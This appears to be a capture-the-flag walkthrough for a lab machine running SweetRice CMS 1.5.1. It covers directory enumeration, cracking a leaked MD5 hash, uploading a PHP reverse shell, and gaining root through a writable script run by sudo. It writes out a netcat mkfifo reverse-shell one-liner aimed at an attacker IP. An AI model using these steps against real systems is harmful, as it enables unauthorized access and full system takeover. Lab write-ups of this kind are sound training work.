# Enumeration

We begin with a quick nmap scan, which identifies ports 22 and 80 as open. A follow-up scan provides more detail:

![bd36944ebbc54f5292934fed71f910d9.png](./_resources/bd36944ebbc54f5292934fed71f910d9.png)

Let's enumerate the web server. The main page is just the default Apache2 Ubuntu page. We'll use gobuster to look for any interesting directories. Run the following:
```bash
gobuster dir -u http://10.10.160.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
```

We eventually find the directory `/content`. Navigating here, we find an under-construction webpage built with the SweetRice CMS.

![9695ef1047f779aaa93cc61a1d1cb4fd.png](./_resources/9695ef1047f779aaa93cc61a1d1cb4fd.png)

Running gobuster again relative to our new directory, we find a few subdirectories.

![3d4af8c99d6a5faa4fe2bca0669fd40b.png](./_resources/3d4af8c99d6a5faa4fe2bca0669fd40b.png)

We find a login form at `/content/as`. 

![23ba85c05d791f8790457d96516f3e89.png](./_resources/23ba85c05d791f8790457d96516f3e89.png)

Navigating to `/content/inc/latest.txt` reveals the version number of the CMS as 1.5.1. More interestingly, we have a backup file located at `/content/inc/mysql_backup/`, which reveals some sensitive information. If we look closely, we find something which appears to be a either a password or a hash.  A quick online search using a hash identifiers reveals that it is indeed an MD5 hash.

![e7ecbc99f4d3a539f6b54cd311ca5af5.png](./_resources/e7ecbc99f4d3a539f6b54cd311ca5af5.png)

Running the hash through an [online hash cracker](https://crackstation.net/) quickly gives us the password. We have a few candidates for the username given by the mysql backup file; cycling through them eventually reveals `manager` as the username associated to the password we found. Logging in greets us with a dashboard page.

![b3bb8b9246bcdb788ad35b9d7c5d7ef0.png](./_resources/b3bb8b9246bcdb788ad35b9d7c5d7ef0.png)

<br>

# Exploitation

Now that we have admin access to the CMS, we can begin looking for an exploit. Let's start by changing the website status so that it is running.

![e7e6c251343f07cf14db91ad37b9d930.png](./_resources/e7e6c251343f07cf14db91ad37b9d930.png)

Using the version info we found earlier, we can search for an exploit. We find a [possible exploit](https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html) for code execution.

![638906506838811ba105d616d9e602ce.png](./_resources/638906506838811ba105d616d9e602ce.png)

Following the instructions given by the exploit, we navigate to the Ads section of the Dashboard. As described by the exploit, we are allowed to upload php files here. We can use this to launch a php reverse shell, such as [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). We modify it and save it as `reverseshellphp`.

![25c919907120aa9a86c76712a4bddd0a.png](./_resources/25c919907120aa9a86c76712a4bddd0a.png)

![566cab73ef3b2a0be947bd7ae1093275.png](./_resources/566cab73ef3b2a0be947bd7ae1093275.png)

Now set up a netcat listener on the chosen port and navigate to `http://10.10.160.235/content/inc/ads/reverseshellphp.php`. The script executes, and we have obtained an initial shell.

![1a9e59b804887ed997dc639e246aa886.png](./_resources/1a9e59b804887ed997dc639e246aa886.png)

Upgrade the shell with `python -c 'import pty; pty.spawn("/bin/bash")'`. We find the `user.txt` flag in the `/home/itguy` directory.

![e1f8a59dc7efe23b0861c7392d45a863.png](./_resources/e1f8a59dc7efe23b0861c7392d45a863.png)

<br>

# Post-exploitation

Let's look for an avenue to escalate our privileges. Use `sudo -l` to list the current user's sudo privileges.

![5970ae152e07c58b1d0bf7d913a950d9.png](./_resources/5970ae152e07c58b1d0bf7d913a950d9.png)

Thus, the current user can run the perl script as sudo. Let's take a look at the contents of the `backup.pl` file.

![e6927d992d7863245389ddf7587696b9.png](./_resources/e6927d992d7863245389ddf7587696b9.png)

It seems like the backup script just runs the `copy.sh` file. Opening the contents of this latter file, we find a reverse shell script.

![d68f164a814883307a1d773e51c4d87d.png](./_resources/d68f164a814883307a1d773e51c4d87d.png)

Note that we have write privileges! Our goal is to edit this script by replacing it with a reverse shell pointing to our attacking machine, then run `backup.pl` as sudo. Since we don't seem to have access to a text editor, we'll have to rewrite the contents of the `copy.sh` file using `echo "<script>" > /etc/copy.sh`. Luckily, there is a curated [list](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) of reverse shell one-liners. I wasn't able to get some of them to work, but eventually I was able to use one of the netcat one-liners.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.30.43 8888 >/tmp/f" > /etc/copy.sh
```

(Here be sure to use a different port from the one used for the initial shell.) Now set up a netcat listener and catch the reverse shell using `sudo /usr/bin/perl /home/itguy/backup.pl`. Since the script is run as sudo, we end up catching a reverse shell with root privileges. From here, we easily locate the root flag.

![ea54184fddb6803cb66807d4f6726662.png](./_resources/ea54184fddb6803cb66807d4f6726662.png)

![6b7093dc327e20969a0cb6350fa07749.png](./_resources/6b7093dc327e20969a0cb6350fa07749.png)

There is an alternative way to obtain the root flag which doesn't involve obtaining a root shell. Since the `copy.sh` is writable by our initial user, we can simply replace its contents with a command that reads the `root.txt` file. (Here, of course, we have to guess the precise location of the root flag.) Going back to our initial shell, we use `echo "cat /root/root.txt" > /etc/copy.sh`. Then using `sudo /usr/bin/perl /home/itguy/backup.pl` prints the contents of the `root.txt` file. Pretty cool!